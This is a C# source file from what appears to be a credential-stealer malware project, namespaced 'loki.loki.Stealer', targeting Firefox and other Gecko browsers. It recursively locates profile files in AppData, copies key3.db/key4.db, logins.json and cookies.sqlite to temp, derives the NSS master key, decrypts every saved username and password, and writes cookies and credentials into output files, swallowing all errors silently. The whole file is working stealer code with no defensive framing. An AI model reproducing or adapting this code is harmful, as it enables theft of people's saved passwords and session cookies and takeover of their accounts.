namespace loki.loki.Stealer
{
    using System;
    using System.Collections.Generic;
    using System.Data;
    using System.Globalization;
    using System.IO;
    using System.Linq;
    using System.Security.Cryptography;
    using System.Text;
    using System.Text.RegularExpressions;
    using System.Threading;
    using Stealer.Cookies;
    using Stealer.Passwords;
    using sqlite;
    using Loki.Gecko;
    using NoiseMe.Drags.App.Models.JSON;

    public static class Mozila
    {
        public static List<string> passwors = new List<string>();
        public static List<string> credential = new List<string>();

        public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
        {
            var list = new List<string>();
            if (files != null && files.Length != 0 && level <= maxLevel)
            {
                try
                {
                    string[] directories = Directory.GetDirectories(baseDirectory);
                    foreach (string path in directories)
                    {
                        try
                        {
                            var directoryInfo = new DirectoryInfo(path);
                            FileInfo[] files2 = directoryInfo.GetFiles();
                            bool flag = false;
                            foreach (FileInfo v in files2)
                            {
                                if (!flag)
                                {
                                    foreach (string v1 in files)
                                    {
                                        if (!flag)
                                        {
                                            if (v1 == v.Name)
                                            {
                                                flag = true;
                                                list.Add(v.FullName);
                                            }
                                        }
                                        else
                                        {
                                            break;
                                        }
                                    }
                                }
                                else
                                {
                                    break;
                                }
                            }
                            foreach (string item in FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
                            {
                                if (!list.Contains(item))
                                {
                                    list.Add(item);
                                }
                            }
                            directoryInfo = null;
                        }
                        catch { }
                    }
                    return list;
                }
                catch
                {
                    return list;
                }
            }
            return list;
        }
        public static readonly string LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");
        public static readonly string TempDirectory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");
        public static readonly string RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");

        public static void Creds(string profile, string browser_name, string profile_name)
        {
            try
            {
                if (File.Exists(Path.Combine(profile, "key3.db")))
                {
                    Lopos(profile, P3k(CreateTempCopy(Path.Combine(profile, "key3.db"))), browser_name, profile_name);
                }

                Lopos(profile, P4k(CreateTempCopy(Path.Combine(profile, "key4.db"))), browser_name, profile_name);

            }
            catch (Exception) { }
        }

        public static void Mozila_still()
        {
            var files = new List<string>();
            files.AddRange(FindPaths(LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
            files.AddRange(FindPaths(RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
            foreach (string item in files)
            {
                string fullName = new FileInfo(item).Directory.FullName;
                string text = item.Contains(RoamingAppData) ? Profile(fullName) : LocalProfile(fullName);
                string profile_name = GetName(fullName);

                CookMhn(fullName, text, profile_name);
                Creds(fullName, text, profile_name);


            }
        }

        private static string GetName(string path)
        {
            try
            {
                string[] array = path.Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);

                return array[array.Length - 1];

            }
            catch
            {
            }
            return "Unknown";
        }
        public static readonly byte[] Key4MagicNumber = new byte[16] { 248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 };

        public static string CreateTempCopy(string filePath)
        {
            string text = CreateTempPath();
            File.Copy(filePath, text, overwrite: true);
            return text;
        }

        public static string CreateTempPath()
        {
            return Path.Combine(TempDirectory, $"tempDataBase{DateTime.Now.ToString("O").Replace(':', '_')}{Thread.CurrentThread.GetHashCode()}{Thread.CurrentThread.ManagedThreadId}");
        }
        public static void CookMhn(string profile, string browser_name, string profile_name)
        {

            try
            {
                string text = Path.Combine(profile, "cookies.sqlite");

                var cNT = new CNT(CreateTempCopy(text));
                cNT.ReadTable("moz_cookies");
                for (int i = 0; i < cNT.RowLength; i++)
                {
                    GetCookies.CCookies++;
                    try
                    {
                        GetCookies.domains.Add(cNT.ParseValue(i, "host").Trim());
                        GetCookies.Cookies_Gecko.Add(cNT.ParseValue(i, "host").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "path").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "expiry").Trim() + "\t" + cNT.ParseValue(i, "name").Trim() + "\t" + cNT.ParseValue(i, "value") + Environment.NewLine);

                    }
                    catch { }
                }
                using (var streamWriter = new StreamWriter(Program.dir + "\\Browsers\\" + profile_name + "_" + browser_name + "_Cookies.txt"))
                {
                    for (int i = 0; i < GetCookies.Cookies_Gecko.Count(); i++)
                        streamWriter.Write(GetCookies.Cookies_Gecko[i]);
                }

            }
            catch (Exception) { }
        }

        public static void Lopos(string profile, byte[] privateKey, string browser_name, string profile_name)
        {
            try
            {
                string path = CreateTempCopy(Path.Combine(profile, "logins.json"));
                if (File.Exists(path))
                {
                    {
                        foreach (JsonValue item in File.ReadAllText(path).FromJSON()["logins"])
                        {
                            GetPasswords.Cpassword++;
                            Asn1DerObject Gecko4 = Asn1Der.Parse(Convert.FromBase64String(item["encryptedUsername"].ToString(saving: false)));
                            Asn1DerObject Gecko42 = Asn1Der.Parse(Convert.FromBase64String(item["encryptedPassword"].ToString(saving: false)));
                            string text = Regex.Replace(TripleDESHelper.DESCBCDecryptor(privateKey, Gecko4.Objects[0].Objects[1].Objects[1].GetObjectData(), Gecko4.Objects[0].Objects[2].GetObjectData(), PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
                            string text2 = Regex.Replace(TripleDESHelper.DESCBCDecryptor(privateKey, Gecko42.Objects[0].Objects[1].Objects[1].GetObjectData(), Gecko42.Objects[0].Objects[2].GetObjectData(), PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);

                            credential.Add("Site_Url : " + item["hostname"] + Environment.NewLine + "Login : " + text + Environment.NewLine + "Password : " + text2 + Environment.NewLine);

                        }
                        for (int i = 0; i < credential.Count(); i++)
                        {
                            passwors.Add("Browser : " + browser_name + Environment.NewLine + "Profile : " + profile_name + Environment.NewLine + credential[i]);
                        }
                        credential.Clear();
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        private static byte[] P4k(string file)
        {
            byte[] result = new byte[24];
            try
            {
                if (!File.Exists(file))
                {
                    return result;
                }
                var cNT = new CNT(file);
                cNT.ReadTable("metaData");
                string s = cNT.ParseValue(0, "item1");
                string s2 = cNT.ParseValue(0, "item2)");
                Asn1DerObject ansobjectS2 = Asn1Der.Parse(Encoding.Default.GetBytes(s2));
                byte[] objectData = ansobjectS2.Objects[0].Objects[0].Objects[1].Objects[0].GetObjectData();
                byte[] objectData2 = ansobjectS2.Objects[0].Objects[1].GetObjectData();
                var inizialize = new MozillaPBE(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
                inizialize.Compute();
                TripleDESHelper.DESCBCDecryptor(inizialize.GetKey(), inizialize.GetIV(), objectData2);
                cNT.ReadTable("nssPrivate");
                int rowLength = cNT.RowLength;
                string s3 = string.Empty;
                for (int i = 0; i < rowLength; i++)
                {
                    if (cNT.ParseValue(i, "a102") == Encoding.Default.GetString(Key4MagicNumber))
                    {
                        s3 = cNT.ParseValue(i, "a11");
                        break;
                    }
                }
                Asn1DerObject ansobjectS3 = Asn1Der.Parse(Encoding.Default.GetBytes(s3));
                objectData = ansobjectS3.Objects[0].Objects[0].Objects[1].Objects[0].GetObjectData();
                objectData2 = ansobjectS3.Objects[0].Objects[1].GetObjectData();
                inizialize = new MozillaPBE(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
                inizialize.Compute();
                result = Encoding.Default.GetBytes(TripleDESHelper.DESCBCDecryptor(inizialize.GetKey(), inizialize.GetIV(), objectData2, PaddingMode.PKCS7));
                return result;
            }
            catch (Exception)
            {
                return result;
            }
        }

        private static byte[] P3k(string file)
        {
            byte[] array = new byte[24];
            try
            {
                if (!File.Exists(file))
                {
                    return array;
                }
                new DataTable();

                var berkeleyDB = new BerkeleyDB(file);

                var Gecko7 = new PasswordCheck(ValueDB(berkeleyDB, (string x) => x.Equals("password-check")));
                string hexString = ValueDB(berkeleyDB, (string x) => x.Equals("global-salt"));

                var Gecko8 = new MozillaPBE(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), ConvertHexStringToByteArray(Gecko7.EntrySalt));
                Gecko8.Compute();

                TripleDESHelper.DESCBCDecryptor(Gecko8.GetKey(), Gecko8.GetIV(), ConvertHexStringToByteArray(Gecko7.Passwordcheck));
                Asn1DerObject Gecko4 = Asn1Der.Parse(ConvertHexStringToByteArray(ValueDB(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
                var Gecko82 = new MozillaPBE(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), Gecko4.Objects[0].Objects[0].Objects[1].Objects[0].GetObjectData());
                Gecko82.Compute();

                Asn1DerObject Gecko42 = Asn1Der.Parse(Asn1Der.Parse(Encoding.Default.GetBytes(TripleDESHelper.DESCBCDecryptor(Gecko82.GetKey(), Gecko82.GetIV(), Gecko4.Objects[0].Objects[1].GetObjectData()))).Objects[0].Objects[2].GetObjectData());

                if (Gecko42.Objects[0].Objects[3].GetObjectData().Length <= 24)
                {
                    array = Gecko42.Objects[0].Objects[3].GetObjectData();
                    return array;
                }
                Array.Copy(Gecko42.Objects[0].Objects[3].GetObjectData(), Gecko42.Objects[0].Objects[3].GetObjectData().Length - 24, array, 0, 24);
                return array;
            }
            catch (Exception)
            {
                return array;
            }
        }
        public static byte[] ConvertHexStringToByteArray(string hexString)
        {
            if (hexString.Length % 2 != 0)
            {
                throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", hexString));
            }
            byte[] array = new byte[hexString.Length / 2];
            for (int i = 0; i < array.Length; i++)
            {
                string s = hexString.Substring(i * 2, 2);
                array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
            }
            return array;
        }
        private static string ValueDB(BerkeleyDB berkeleyDB, Func<string, bool> predicate)
        {
            if (berkeleyDB is null)
                throw new ArgumentNullException(nameof(berkeleyDB));
            if (predicate is null)
                throw new ArgumentNullException(nameof(predicate));

            string text = string.Empty;
            try
            {
                foreach (KeyValuePair<string, string> key in berkeleyDB.Keys)
                {
                    if (predicate(key.Key))
                    {
                        text = key.Value;
                    }
                }
            }
            catch (Exception)
            {
            }
            return text.Replace("-", string.Empty);
        }

        private static string Profile(string profilesDirectory)
        {
            string text = string.Empty;
            try
            {
                string[] array = profilesDirectory.Split(new string[1]
                {
                    "AppData\\Roaming\\"
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);
                text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
            }
            catch (Exception)
            {
            }
            return text.Replace(" ", string.Empty);
        }

        private static string LocalProfile(string profilesDirectory)
        {
            string text = string.Empty;
            try
            {
                string[] array = profilesDirectory.Split(new string[1]
                {
                    "AppData\\Local\\"
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);
                text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
            }
            catch (Exception)
            {
            }
            return text.Replace(" ", string.Empty);
        }
    }
}